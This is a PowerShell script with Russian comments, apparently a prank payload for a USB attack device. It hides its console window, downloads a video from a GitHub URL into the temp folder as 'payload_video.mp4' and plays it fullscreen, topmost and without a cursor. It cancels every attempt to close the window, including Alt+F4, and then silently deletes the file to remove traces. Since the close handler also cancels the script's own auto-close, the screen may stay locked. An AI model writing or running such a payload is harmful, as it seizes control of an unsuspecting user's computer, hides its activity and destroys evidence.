# 1. Скрываем консоль максимально надежно
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# 2. Прямая ссылка на видео (твоя рабочая ссылка)
$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
$f = "$env:TEMP\payload_video.mp4"

try {
    # Скачивание
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    # 3. Интерфейс плеера
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Автозакрытие по окончании
    $v.add_MediaEnded({ $w.Close() })
    
    # Запрет на закрытие (Alt+F4)
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} 
catch {
    # Если не скачалось, тихо выходим
    exit
}
finally {
    # 4. Удаление следов
    Start-Sleep -Seconds 1
    if (Test-Path $f) { 
        Remove-Item $f -Force -ErrorAction SilentlyContinue 
    }
}
